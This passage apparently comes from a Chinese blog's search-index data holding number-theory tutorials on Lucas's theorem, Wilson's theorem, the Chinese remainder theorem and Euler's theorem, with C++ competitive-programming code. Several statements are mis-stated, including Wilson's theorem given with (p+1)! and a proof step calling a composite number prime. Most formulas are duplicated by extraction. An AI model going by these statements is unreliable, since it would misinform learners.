p+b}≡(1+x^p)^a\\times (1+x)^ b(\\mod p)(1+x)a×p+b≡(1+xp)a×(1+x)b(modp) 由二项式定理得： (1+x)a×p+b≡∑i=0i→a(Cai×xp×i)×∑j=0j→b(Cbj×xj)(mod p)(1+x)^{a\\times p+b}≡\\displaystyle \\sum^{i\\to a}_{i=0}(C_a^i\\times x^{p\\times i})\\times \\displaystyle \\sum^{j\\to b}_{j=0}(C_b^j\\times x^j)(\\mod p)(1+x)a×p+b≡i=0∑i→a​(Cai​×xp×i)×j=0∑j→b​(Cbj​×xj)(modp) 考虑等号两边xmx^mxm的系数： 由二项式定理得左边xmx^mxm的系数为：CnmC_n^mCnm​ 将右边的式子展开，显然当i,j满足p×i+j==mp\\times i+j==mp×i+j==m时为xmx^mxm的系数,也就是i==c,j==di==c,j==di==c,j==d时，也就是： Cac×CbdC_a^c\\times C_b^dCac​×Cbd​ 则能得到等式Cnm≡Cab×Cbd(mod p)C_n^m≡C_a^b\\times C_b^d(\\mod p)Cnm​≡Cab​×Cbd​(modp) 于是定理得到了证明。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;algorithm&gt;using namespace std;typedef long long ll;//计算n！%modll fact(ll n,ll mod)&#123; ll res=1; for (int i = 1; i &lt;= n; ++i) &#123; res=(res*i)%mod; &#125; return res;&#125;void exgcd(ll a,ll b,ll &amp;x,ll &amp;y,ll &amp;d)&#123; if(!b) &#123; d=a; x=1; y=0; &#125; else&#123; exgcd(b,a%b,y,x,d); y-=x*(a/b); &#125;&#125;//用exgcd计算t模mod的逆元ll inv(ll t,ll mod)&#123; ll d,x,y; exgcd(t,mod,x,y,d); return d==1?(x%mod+mod)%mod:-1;&#125;//计算C(n,m)%mod:C(n,m)%mod=(n!/[m!*(n-m)!])%mod=n!%mod*inv(m!,mod)%mod*inv((n-m)!,mod)%modll comb(ll n,ll m,ll mod)&#123; if(m&lt;0||m&gt;n)return 0; return fact(n,mod)*inv(fact(m,mod),mod)%mod*inv(fact(n-m,mod),mod)%mod;&#125;//lucas定理:C(n,m)%mod=C(n/mod,m/mod)*C(n%mod,m%mod)%modll lucas(ll n,ll m,ll mod)&#123; return m?lucas(n/mod,m/mod,mod)*comb(n%mod,m%mod,mod)%mod:1;&#125; 拓展Lucas定理 考虑如果p不是素数的情况，我们考虑利用唯一分解定理将p分解为若干素数的乘积，于是可以将式子分解为一组方程组，即： Cnm≡r1(mod p1)C_n^m≡r_1(\\mod p_1)Cnm​≡r1​(modp1​) Cnm≡r2(mod p2)C_n^m≡r_2(\\mod p_2)Cnm​≡r2​(modp2​) Cnm≡r3(mod p3)C_n^m≡r_3(\\mod p_3)Cnm​≡r3​(modp3​) . . . Cnm≡rk(mod pk)C_n^m≡r_k(\\mod p_k)Cnm​≡rk​(modpk​) 于是这个方程组又让我们想到了中国剩余定理（CRT），于是我们就可以使用Lucas定理把r1…rkr_1…r_kr1​…rk​求出来，再用中国剩余定理求解CnmC_n^mCnm​。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;using namespace std;typedef long long ll;#define MAXN 15ll t;ll n,m;ll k;ll a[MAXN];ll r[MAXN];//唯一分解定理将mod分解为素数ll fj(ll n)&#123; int c=0; for(int i=2;i&lt;=n;i++) &#123; while(n%i==0) &#123; a[c++]=i; n/=i; &#125; &#125; return c;&#125;//快速乘取模ll mul(ll a,ll b,ll mod)&#123; ll res=0; while(b) &#123; if(b&amp;1)res=(res+a)%mod; a=(a+a)%mod; b&gt;&gt;=1; &#125; return res;&#125;//计算n！%modll fact(ll n,ll mod)&#123; ll res=1; for (int i = 1; i &lt;= n; ++i) &#123; res=(res*i)%mod; &#125; return res;&#125;void exgcd(ll a,ll b,ll &amp;x,ll &amp;y,ll &amp;d)&#123; if(!b) &#123; d=a; x=1; y=0; &#125; else&#123; exgcd(b,a%b,y,x,d); y-=x*(a/b); &#125;&#125;//用exgcd计算t模mod的逆元ll inv(ll t,ll mod)&#123; ll d,x,y; exgcd(t,mod,x,y,d); return d==1?(x%mod+mod)%mod:-1;&#125;//计算C(n,m)%mod:C(n,m)%mod=(n!/[m!*(n-m)!])%mod=n!%mod*inv(m!,mod)%mod*inv((n-m)!,mod)%modll comb(ll n,ll m,ll mod)&#123; if(m&lt;0||m&gt;n)return 0; return fact(n,mod)*inv(fact(m,mod),mod)%mod*inv(fact(n-m,mod),mod)%mod;&#125;//lucas定理:C(n,m)%mod=C(n/mod,m/mod)*C(n%mod,m%mod)%modll lucas(ll n,ll m,ll mod)&#123; return m?lucas(n/mod,m/mod,mod)*comb(n%mod,m%mod,mod)%mod:1;&#125;//中国剩余定理求解C(n,m)%mod=C(n,m)%(a1*a2*a3...)(ai为素数)ll china(ll n,ll *d,ll *m)&#123; ll M = 1, ret = 0; for(int i = 0; i &lt; n; i ++) M *= m[i]; for(int i = 0; i &lt; n; i ++) &#123; ll w = M / m[i]; ret = (ret + mul(w * inv(w, m[i]), d[i], M)) % M; &#125; return (ret + M) % M;&#125;int main()&#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;n&gt;&gt;m&gt;&gt;k; ll num=fj(k);//分解模k for (int i = 0; i &lt;num; ++i) &#123; r[i]=lucas(n,m,a[i]); &#125; cout&lt;&lt;china(num,r,a)&lt;&lt;endl; &#125; return 0;&#125;","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论进阶","slug":"ACM/数论进阶","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E8%BF%9B%E9%98%B6/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论入门:四大定理之威尔逊定理","slug":"数论入门-四大定理之威尔逊定理","date":"2021-01-18T11:20:08.000Z","updated":"2024-07-30T11:26:33.933Z","comments":true,"path":"2021/01/18/数论入门-四大定理之威尔逊定理/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8-%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E4%B9%8B%E5%A8%81%E5%B0%94%E9%80%8A%E5%AE%9A%E7%90%86/","excerpt":"","text":"数论四大定理 Ⅰ.威尔逊定理 Ⅱ.欧拉定理 Ⅲ.孙子剩余定理 Ⅳ.费马小定理 威尔逊定理 内容 若一个数p为素数的充要条件为:p可以整除(p+1)!+1(p+1)!+1(p+1)!+1 证明 充分性 证明定理的充分性，则只要证明当p可以整除(p+1)!+1(p+1)!+1(p+1)!+1时，p为素数。 考虑到从正面直接证明不太好证明，则考虑使用反正法，也就是证明该命题的逆否命题，p为合数时，p不能整除(p+1)!+1(p+1)!+1(p+1)!+1 进一步把命题公式化，也就是: 若p为合数，则(p−1)!+1≡0(mod p)不成立(p-1)!+1≡0(\\mod p)不成立(p−1)!+1≡0(modp)不成立 也就是p为素数，则(p−1)!≡−1(mod p)不成立(p-1)!≡-1(\\mod p)不成立(p−1)!≡−1(modp)不成立 原因很简单，因为(p−1)!+1≡0(mod p)(p-1)!+1≡0(\\mod p)(p−1)!+1≡0(modp)，则(p−1)!+1=p×x+0(p-1)!+1=p\\times x+0(p−1)!+1=p×x+0 移项得 (p−1)!=p×x−1(p-1)!=p\\times x-1(p−1)!=p×x−1 于是初步把这个式子定为(p−1)!≡−1(mod p)(p-1)!≡-1(\\mod p)(p−1)!≡−1(modp) 那么当p为素数时，有p=a×bp=a\\times bp=a×b (1&lt;a&lt;p−1,1&lt;b&lt;p−1)(1 &lt; a &lt; p-1,1 &lt; b &lt; p-1)(1&lt;a&lt;p−1,1&lt;b&lt;p−1)， a，b有以下两种情况 ①.a≠ba\\neq ba=b ②.a=ba=ba=b ① 当a≠ba\\neq ba=b时， 因为1&lt;a&lt;p−1,1&lt;b&lt;p−11 &lt; a &lt; p-1,1 &lt; b &lt; p-11&lt;a&lt;p−1,1&lt;b&lt;p−1 (p−1)!=1×2×…×a×…×b×…×(p−1)(p-1)!=1 \\times 2 \\times …\\times a \\times …\\times b \\times… \\times (p-1)(p−1)!=1×2×…×a×…×b×…×(p−1), 所以(p−1)!≡0(mod a∗b)(p-1)!≡ 0 (\\mod a*b)(p−1)!≡0(moda∗b)， 即 (p−1)!≡0(mod p)(p-1)!≡ 0 (\\mod p)(p−1)!≡0(modp) 与( p -1 )! ≡ -1 ( mod p ) 矛盾 ② 因为方程a2&gt;2aa^2 &gt; 2aa2&gt;2a在非负数域的解为a&gt;2a &gt; 2a&gt;2,则当a&gt;2时有如下等式 (p−1)!=1×2×…×a×…×2a×…×(p−1)(p-1)!=1 \\times 2 \\times … \\times a \\times …\\times 2a \\times … \\times (p-1)(p−1)!=1×2×…×a×…×2a×…×(p−1). 所以可得((p-1)!≡ 0 (mod a*a) ，即 (p−1)!≡0(modp)(p-1)!≡ 0 (mod p)(p−1)!≡0(modp) 与(p−1)!≡−1(modp)(p -1 )! ≡ -1 ( mod p )(p−1)!≡−1(modp) 矛盾 当p=4p=4p=4，也就是a=2时，(p−1)!≡3(modp)(p-1)!≡ 3 (mod p)(p−1)!≡3(modp)与(p−1)!≡−1(modp)(p -1 )! ≡ -1 ( mod p )(p−1)!≡−1(modp) 矛盾 因此定理的充分性得证。 必要性 证明必要性，也就是证明命题: 若p为素数则(p−1)!≡−1(mod p)(p-1)!≡-1(\\mod p)(p−1)!≡−1(modp) 要证此命题只要证明: (p−1)!≡p−1(mod p)(p-1)!≡p-1(\\mod p)(p−1)!≡p−1(modp) 也就是证明： (p−2)!≡1(mod p)(p-2)!≡1(\\mod p)(p−2)!≡1(modp) 于是先对特殊情况进行讨论： 当p为2，(p−1)!≡−1(mod p)( p -1 )! ≡ -1 ( \\mod p )(p−1)!≡−1(modp) 显然成立 当p为3，$( p -1 )! ≡ -1 ( \\mod p ) $显然成立 接下来我们情况进行讨论： 证明(p−2)!≡1(mod p)(p-2)!≡1(\\mod p)(p−2)!≡1(modp)，也就是证明在[1,p−1)[1,p-1)[1,p−1)中，除1以外的任意一元素a都能找到唯一一个元素b，使得a×b≡1(mod p)a\\times b≡ 1 (\\mod p)a×b≡1(modp) 下面证明唯一性: 证明唯一性也就是证明任意一个元素，无法找到某两个元素t1,t2，使得 a×t1≡a×t2(mod p)a\\times t1≡a\\times t2(\\mod p)a×t1≡a×t2(modp) 对于p≥5p\\geq 5p≥5，令M=2,3,4,…,p−2M={2,3,4,…,p-2}M=2,3,4,…,p−2. 对于a∈Ma\\in Ma∈M，令N=a,2×a,3×a,4×a,….(p−2)×a,(p−1)×aN={a,2\\times a,3\\times a,4\\times a,….(p-2)\\times a,(p-1)\\times a}N=a,2×a,3×a,4×a,….(p−2)×a,(p−1)×a 令1≤t1≤p−1,1≤t2≤p−1,t1≠t21 \\leq t1 \\leq p-1 ,1 \\leq t2 \\leq p-1,t1 ≠ t21≤t1≤p−1,1≤t2≤p−1,t1=t2 那么t1×a∈N，t2×a∈Nt1\\times a\\in N，t2\\times a\\in Nt1×a∈N，t2×a∈N。 若t1×a≡t2×a(mod p)t1\\times a≡t2\\times a (\\mod p)t1×a≡t2×a(modp) ，那么∣t1−t2∣×a≡0(mod p)|t1-t2|\\times a ≡ 0 (\\mod p)∣t1−t2∣×a≡0(modp)。 因为∣t1−t2∣×a∈N|t1-t2|\\times a\\in N∣t1−t2∣×a∈N，与N中元素不能被p除尽矛盾。 所以t1×a≡t2×a(mod p)t1\\times a≡t2\\times a(\\mod p)t1×a≡t2×a(modp)不成立,唯一性得证。 下面证明存在性： 证明存在性也就是证明对于任意一个元素a∈Ma\\in Ma∈M，存在一个元素b∈Mb\\in Mb∈M使得a×b≡0(mod p)a\\times b≡0(\\mod p)a×b≡0(modp)。 设x∈[1,p),且x×a≡1(mod p)x\\in [1,p),且 x\\times a ≡ 1 (\\mod p)x∈[1,p),且x×a≡1(modp)。 当x=1x=1x=1时,x×a=ax\\times a=ax×a=a,对p取模为a，所以不成立。 当x=p−1x=p-1x=p−1时,(p−1)×a=p×a−a(p-1)\\times a=p\\times a-a(p−1)×a=p×a−a, 对p取模为-a，所以不成立。 当x=ax=ax=a时，a×a≡1(modp)a\\times a≡1 (mod p)a×a≡1(modp)，可得(a+1)×(a−1)≡0(modp),a=1或a=p−1(a+1)\\times (a-1)≡ 0 (mod p),a=1或a=p-1(a+1)×(a−1)≡0(modp),a=1或a=p−1，所以不成立。 综上所述，x,a∈M，并且当a改变时，x随之改变,所以存在性得证。 所以，M集合中每一个元素a都能够找到一个与之配对的x，使得x*a ≡ 1 (mod p). (p−1)!=1×2×3×…(p−1)=1×(2×x2)×(3×x3)…×(p−1)(p-1)!=1\\times 2 \\times 3 \\times … (p-1)=1 \\times (2 \\times x_2) \\times (3 \\times x_3)_…\\times (p-1)(p−1)!=1×2×3×…(p−1)=1×(2×x2​)×(3×x3​)…​×(p−1) 所以，(p−1)!≡1∗(p−1)(mod p)(p-1)!≡1*(p-1)(\\mod p)(p−1)!≡1∗(p−1)(modp) 即，(p−1)!≡−1(mod p)(p-1)!≡-1(\\mod p)(p−1)!≡−1(modp) 证明完毕 参考链接 Ⅰ.百度百科 Ⅱ.BNUOJ 1093 YAPTCHA题解","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论入门","slug":"ACM/数论入门","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论入门:四大定理之孙子剩余定理","slug":"数论入门-四大定理之孙子剩余定理","date":"2021-01-18T11:03:55.000Z","updated":"2024-07-30T11:26:33.933Z","comments":true,"path":"2021/01/18/数论入门-四大定理之孙子剩余定理/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8-%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E4%B9%8B%E5%AD%99%E5%AD%90%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/","excerpt":"","text":"​ 内容 孙子定理也叫中国剩余定理，也就是Chinese remainder theorem，简称CRT，是中国古代求解一次线性同余方程组的方法，最早源于南北朝时期的数学著作《孙子算经》中的一到叫“物不知数”的问题，原文如下： 有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？即，一个整数除以三余二，除以五余三，除以七余二，求这个整数。《孙子算经》中首次提到了同余方程组问题，以及以上具体问题的解法，因此在中文数学文献中也会将中国剩余定理称为孙子定理。 物不知数中给出了这样的一个问题： (s):(s):(s): x≡a1(mod m1)x≡a_1(\\mod m_1)x≡a1​(modm1​) x≡a2(mod m2)x≡a_2(\\mod m_2)x≡a2​(modm2​) . . . x≡an(mod mn) x≡a_n(\\mod m_n)x≡an​(modmn​) 中国剩余定理给出了这个方程有解的条件，以及使用构造法给出了方程的解： 假设m1,m2,…,mnm_1,m_2,…,m_nm1​,m2​,…,mn​两两互质，则对任意的整数：a1,a2,…,ana_1,a_2,…,a_na1​,a2​,…,an​，方程组（s）有解，并且通解可以用如下方式构造得到： 设M=m1×m2×…×mnM=m_1\\times m_2\\times …\\times m_nM=m1​×m2​×…×mn​，并设Mi=M/mi,i∈(1,2,…,n)M_i=M/m_i,i\\in (1,2,…,n)Mi​=M/mi​,i∈(1,2,…,n)，设ti=inv(Mi,mi)t_i=inv(M_i,m_i)ti​=inv(Mi​,mi​)即MiM_iMi​模mim_imi​的逆元，则有：ti×Mi≡1(mod mi)t_i\\times M_i≡1(\\mod m_i)ti​×Mi​≡1(modmi​) 于是（S）的通解为x=a1×t1×M1+a2×t2×M2+…+an×tn×Mn+K×M（k∈Z）x=a_1\\times t_1\\times M_1+a_2\\times t_2\\times M_2+…+a_n\\times t_n\\times M_n+K\\times M（k \\in Z）x=a1​×t1​×M1​+a2​×t2​×M2​+…+an​×tn​×Mn​+K×M（k∈Z） 再模M的情况下，x的值唯一，即：x=(a1×t1×M1+a2×t2×M2+…+an×tn×Mn)mod Mx=(a_1\\times t_1\\times M_1+a_2\\times t_2\\times M_2+…+a_n\\times t_n\\times M_n) \\mod Mx=(a1​×t1​×M1​+a2​×t2​×M2​+…+an​×tn​×Mn​)modM 证明 直接证明 我们从构造的假设出发来证明这样的解的正确性： 由于tit_iti​是MiM_iMi​取模mim_imi​下的逆元，则可得到式子： ti×Mi≡1(mod mi)t_i\\times M_i≡1(\\mod m_i)ti​×Mi​≡1(modmi​) 于是两边同时乘以aia_iai​就得到式子： ai×ti×Mi≡ai(mod mi)a_i\\times t_i\\times M_i≡a_i(\\mod m_i)ai​×ti​×Mi​≡ai​(modmi​) （能同时乘以aia_iai​是因为aia_iai​小于mim_imi​，所以aia_iai​与mim_imi​互质） 再通过mim_imi​的性质可以得到： ai×ti×Mi≡0(mod mj)a_i\\times t_i\\times M_i≡0(\\mod m_j)ai​×ti​×Mi​≡0(modmj​)其中j∈(1,2,…,n)且j≠ij \\in (1,2,…,n) 且 j\\neq ij∈(1,2,…,n)且j=i 则由以上性质可以得到x=a1×t1×M1+a2×t2×M2+…+an×tn×Mnx=a_1\\times t_1\\times M_1+a_2\\times t_2\\times M_2+…+a_n\\times t_n\\times M_nx=a1​×t1​×M1​+a2​×t2​×M2​+…+an​×tn​×Mn​是方程组的一个解。 再者，若x1x_1x1​与x2x_2x2​都为方程组的解，那么将会得到如下等式: x1−x2≡0(mod mi)x_1-x_2≡0(\\mod m_i)x1​−x2​≡0(modmi​) 由于m1,…,mnm_1,…,m_nm1​,…,mn​中的数两两互素，那么两边依次同时乘以这些数等式依然成立，于是得到: (x1−x2)∗M=0(mod M)(x_1-x_2)*M=0(\\mod M)(x1​−x2​)∗M=0(modM) 然后由取模运算的性质得到： x1−x2=0(mod M)x_1-x_2=0(\\mod M)x1​−x2​=0(modM) 即两个解之间的差为M的倍数，最小为M，于是满足以下式子： x=a1×t1×M1+a2×t2×M2+…+an×tn×Mn+K×M（k∈Z）x=a_1\\times t_1\\times M_1+a_2\\times t_2\\times M_2+…+a_n\\times t_n\\times M_n+K\\times M（k \\in Z）x=a1​×t1​×M1​+a2​×t2​×M2​+…+an​×tn​×Mn​+K×M（k∈Z） 的x都是方程的解。 构造思考过程 这里为了更清晰的描述这个证明，我们举个例子来分析一下思考构造的过程： 有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？ 就用孙子算经中提出的问题来举例，根据题面描述，我们能提炼出如下方程: (s):(s):(s): x≡2(mod 3)x≡2(\\mod 3)x≡2(mod3) x≡3(mod 5)x≡3(\\mod 5)x≡3(mod5) x≡2(mod 7)x≡2(\\mod 7)x≡2(mod7) 于是会想如果把这些方程分别求解，那么解的结果会是什么呢？ 可以想到由于存在： x1×inv(x1,3)≡1(mod 3)x_1\\times inv(x_1,3)≡1(\\mod 3)x1​×inv(x1​,3)≡1(mod3) x2×inv(x2,5)≡1(mod 5)x_2\\times inv(x_2,5)≡1(\\mod 5)x2​×inv(x2​,5)≡1(mod5) x3×inv(x3,7)≡1(mod 7)x_3\\times inv(x_3,7)≡1(\\mod 7)x3​×inv(x3​,7)≡1(mod7) 于是让等式两边同时乘以对应的余数： 2×x1×inv(x1,3)≡2(mod 3)2\\times x_1\\times inv(x_1,3)≡2(\\mod 3)2×x1​×inv(x1​,3)≡2(mod3) 3×x2×inv(x2,5)≡3(mod 5)3\\times x_2\\times inv(x_2,5)≡3(\\mod 5)3×x2​×inv(x2​,5)≡3(mod5) 2×x3×inv(x3,7)≡2(mod 7)2\\times x_3\\times inv(x_3,7)≡2(\\mod 7)2×x3​×inv(x3​,7)≡2(mod7) 设： a=2×x1×inv(x1,3)a=2\\times x_1\\times inv(x_1,3)a=2×x1​×inv(x1​,3) b=3×x2×inv(x2,5)b=3\\times x_2\\times inv(x_2,5)b=3×x2​×inv(x2​,5) c=2×x3×inv(x3,7)c=2\\times x_3\\times inv(x_3,7)c=2×x3​×inv(x3​,7) 于是思考这些数加起来，即a+b+ca+b+ca+b+c，能不能构造出结果呢？，显然是不能的，那么是因为什么原因导致不能呢？因为在取模3时虽然a取模3能得到2，但是b，c取模3并不为0。 于是为了解决这个问题，我们令： x1=5×7x_1=5\\times 7x1​=5×7 x2=3×7x_2=3\\times 7x2​=3×7 x3=3×5x_3=3\\times 5x3​=3×5 就能解决这个问题了，于是s的解就是： a+b+c=2×5×7×inv(5×7,3)+3×3×7×inv(x2=3×7,5)+2×3×5×inv(3×5,7)=233a+b+c=2\\times 5\\times 7\\times inv(5\\times 7,3)+3\\times 3\\times 7\\times inv(x_2=3\\times 7,5)+2\\times 3\\times 5\\times inv(3\\times 5,7)=233a+b+c=2×5×7×inv(5×7,3)+3×3×7×inv(x2​=3×7,5)+2×3×5×inv(3×5,7)=233 那么最小的解就是233mod (2×5×7)=23233\\mod (2\\times 5\\times 7)=23233mod(2×5×7)=23。 代码 取模的数互质的情况 1234567891011//需使用求逆元的函数（此代码中未给出）//n个方程：x=a[i](mod m[i]) (0&lt;=i&lt;n)LL china(int n, LL *a, LL *m)&#123; LL M = 1, ret = 0; for(int i = 0; i &lt; n; i ++) M *= m[i]; for(int i = 0; i &lt; n; i ++)&#123; LL w = M / m[i]; ret = (ret + w * inv(w, m[i]) * a[i]) % M; &#125; return (ret + M) % M;&#125; 扩展中国剩余定理 从之前证明的中国剩余定理来看，最小解的构造需要取模数两两互质，那么如果并不能保证两两互质，问最小解，那么要怎么求呢？ 下面介绍中国剩余定理的扩展。 证明 对于两组方程的情况： $x≡b_1(\\mod a_1) $ $x≡b_2(\\mod a_2) $ 通过转化得到以下方程： $x=a_1\\times x_1+b_1 $ $x=a_2\\times x_2+b_2 $ 于是我们尝试合并两方程，即： $a_1\\times x_1+b_1=a_2\\times x_2+b_2 $ 移项得： $a_1\\times x_1+（-a_2）\\times x_2=b_2-b_1 $ 这个式子是不是很眼熟o(￣▽￣)ｄ 没错是斐蜀定理本定理没错了 于是这个方程有解的条件就是当gcd(a1,a2)∣(b2−b1)gcd(a_1,a_2)|(b_2-b_1)gcd(a1​,a2​)∣(b2​−b1​). 既然满足斐蜀定理，那么我们就能通过拓展欧几里得算法求解x1x_1x1​的解了,于是我们先求接方程$a_1\\times x_1+（-a_2）\\times x_2=gcd(a_1,a_2) ,假设求得的解为, 假设求得的解为,假设求得的解为K_1,K_2$，于是带入原式为： $a_1\\times K_1+（-a_2）\\times K_2=gcd(a_1,a_2) $ 然后两边同时乘以(x2−x1)/gcd(a1,a2)(x_2-x_1)/gcd(a_1,a_2)(x2​−x1​)/gcd(a1​,a2​) 于是得到： $a_1\\times K_1\\times (x_2-x_1)/gcd(a_1,a_2)+（-a_2）\\times K_2\\times (x_2-x_1)/gcd(a_1,a_2)=b_2-b_1 $ 于是有对应关系得到： x1=K1×(x2−x1)/gcd(a1,a2)x_1=K_1\\times (x_2-x_1)/gcd(a_1,a_2)x1​=K1​×(x2​−x1​)/gcd(a1​,a2​) x2=K2×(x2−x1)/gcd(a1,a2)x_2=K_2\\times (x_2-x_1)/gcd(a_1,a_2)x2​=K2​×(x2​−x1​)/gcd(a1​,a2​) 于是原方程为： x=K1×(x2−x1)/gcd(a1,a2)×a1+b1x=K_1\\times (x_2-x_1)/gcd(a_1,a_2)\\times a_1+b_1x=K1​×(x2​−x1​)/gcd(a1​,a2​)×a1​+b1​ x=K2×(x2−x1)/gcd(a1,a2)×a2+b2x=K_2\\times (x_2-x_1)/gcd(a_1,a_2)\\times a_2+b_2x=K2​×(x2​−x1​)/gcd(a1​,a2​)×a2​+b2​ 由于解K1,K2K_1,K_2K1​,K2​不只一组，所以对应的x也不一样，于是考虑两个x之间的差值d，由第一个方程可以知道d是(x2−x1)/gcd(a1,a2)×a1(x_2-x_1)/gcd(a_1,a_2)\\times a_1(x2​−x1​)/gcd(a1​,a2​)×a1​的倍数。 而由第二个方程可以知道d也是(x2−x1)/gcd(a1,a2)×a2(x_2-x_1)/gcd(a_1,a_2)\\times a_2(x2​−x1​)/gcd(a1​,a2​)×a2​的倍数。 所以d一定是(a1×a2)/gcd(a1,a2)(a_1\\times a_2)/gcd(a_1,a_2)(a1​×a2​)/gcd(a1​,a2​)的倍数 即d是lcm(a1,a2)lcm(a_1,a_2)lcm(a1​,a2​)的倍数。 于是通过第一个方程构造x，得到： x=a1×x1+b1+t×lcm(a1,a2)x=a_1\\times x_1+b_1+t\\times lcm(a_1,a_2)x=a1​×x1​+b1​+t×lcm(a1​,a2​) 于是上述方程组可以合并为： $x≡a_1\\times x_1+b_1(\\mod lcm(a_1,a_2)) $ 于是我们就可以通过上述方法一直合并下去最合并为一个方程然后求接。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;math.h&gt;using namespace std;typedef long long ll;ll n,m;ll a[1000];ll b[1000];void exgcd(ll a,ll b,ll &amp;d,ll &amp;x,ll &amp;y)&#123; if(b) &#123; exgcd(b,a%b,d,x,y); ll temp=x; x=y; y=temp-a/b*y; &#125; else &#123; x=1; y=0; d=a; &#125;&#125;int main()&#123; std::ios::sync_with_stdio(false); ll t; cin&gt;&gt;t; ll num=1; while(t--) &#123; cin&gt;&gt;m; for(ll i=0;i&lt;m;i++) &#123; cin&gt;&gt;b[i]; &#125; for(ll j=0;j&lt;m;j++) &#123; cin&gt;&gt;a[j]; &#125; ll F=(a[0]%b[0]+b[0])%b[0]; bool flat=true; for(ll i=0;i&lt;m-1;i++) &#123; ll k1,k2,d; exgcd(b[i],b[i+1],d,k1,k2); //cout&lt;&lt;k1&lt;&lt;&#x27; &#x27;; if((a[i+1]-a[i])%d) &#123; flat=false; break; &#125; k1*=(a[i+1]-a[i])/d; F=k1*b[i]+a[i]; b[i+1]=b[i]/d*b[i+1]; F=(F%b[i+1]+b[i+1])%b[i+1]; a[i+1]=F; //cout&lt;&lt;F&lt;&lt;&#x27; &#x27;&lt;&lt;d&lt;&lt;&#x27; &#x27;&lt;&lt;k2&lt;&lt;endl; &#125; if(!F) F+=b[m-1]; if(flat) cout&lt;&lt;&quot;Case &quot;&lt;&lt;num++&lt;&lt;&quot;: &quot;&lt;&lt;F&lt;&lt;endl; else cout&lt;&lt;&quot;Case &quot;&lt;&lt;num++&lt;&lt;&quot;: &quot;&lt;&lt;-1&lt;&lt;endl; &#125; return 0;&#125; 参考链接 Ⅰ.中国剩余定理证明 Ⅱ.扩展中国剩余定理证明","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论入门","slug":"ACM/数论入门","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论入门:四大定理之欧拉定理与费马小定理","slug":"数论入门-四大定理之欧拉定理与费马小定理","date":"2021-01-18T10:57:19.000Z","updated":"2024-07-30T11:26:33.933Z","comments":true,"path":"2021/01/18/数论入门-四大定理之欧拉定理与费马小定理/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8-%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E4%B9%8B%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86%E4%B8%8E%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/","excerpt":"","text":"数论四大定理 Ⅰ.威尔逊定理 Ⅱ.欧拉定理 Ⅲ.孙子剩余定理 Ⅳ.费马小定理 欧拉定理 内容 对于整数n,a且n,a互质则有 aφ（n）≡1（mod n）a^{φ（n）}≡ 1（\\mod n）aφ（n）≡1（modn） 其中φ（n）φ（n）φ（n）为n的欧拉函数值 欧拉函数 百度百科 φ(n)φ(n)φ(n)为小于n的正整数种与n互质的数的数目。 证明 要证aφ(n)≡1（mod n）a^{φ(n)}≡ 1（\\mod n）aφ(n)≡1（modn）只要证明aφ（n)−1≡0（mod n）a^{φ（n)}-1≡ 0（\\mod n）aφ（n)−1≡0（modn） 接下来我们先将这φ(n)φ(n)φ(n)个数按顺序排列，设排列后得到： $x_1,x_2……x_{φ(n)} $ 再者，我们令 $m_1=a_{x_1},m_2=a_{x_2}……m_{φ(n)} = a_{φ(n)} $ 最后分两步证明： Ⅰ.证明$m_1,m_2……m_{φ(n)} 